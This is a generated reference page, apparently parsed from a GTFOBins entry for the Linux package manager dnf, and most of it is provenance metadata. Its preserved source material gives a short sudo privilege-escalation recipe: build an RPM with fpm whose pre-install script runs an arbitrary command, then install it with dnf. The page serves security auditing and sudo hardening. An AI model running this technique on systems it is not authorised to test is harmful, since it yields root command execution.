---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# dnf

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `dnf` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dnf` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [dnf](../../tools/linux/dnf.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dnf |
| name | dnf |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/dnf/ |

## Preserved Source Material

````yaml
_body: ''
_name: dnf
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/dnf
functions:
  command:
  - code: dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
    comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.


      ```

      echo /path/to/command >x.sh

      fpm -n x -s dir -t rpm -a all --before-install x.sh .

      ```


      The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.'
    contexts:
      sudo: null
````
